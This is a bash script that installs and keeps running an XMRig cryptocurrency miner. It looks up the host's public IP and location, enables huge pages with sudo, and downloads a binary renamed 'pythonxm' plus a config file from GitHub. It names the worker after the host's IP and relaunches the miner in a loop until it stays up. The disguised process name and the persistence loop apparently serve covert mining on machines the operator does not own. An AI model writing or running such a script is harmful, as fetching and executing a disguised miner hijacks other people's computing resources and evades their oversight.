#!bin/bash -xe 
echo '#### Version 0.0.5 ####'
if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
then 
echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
# info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl -s ipinfo.io

# Cleaner
rm -rf pythonxm
rm -rf config.json
rm -rf x.out

#EN1GB
#!/bin/bash -e

# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages

sudo sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    sudo mkdir "$i/hugepages/hugepages-1048576kB";
    sudo echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

echo "1GB pages successfully enabled"

##########

# Prepare
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+$IPNAME+g" config.json


./pythonxm -c config.json 

while [ $(ps -aux |grep pythonxm |wc -l) -le 1 ] 
  do
  echo '######### execution #########'
  ./pythonxm -c config.json
  done

else 

echo "It's ok : $(ps -aux |grep pythonxm |wc -l)"; 
  tail -f x.out
fi
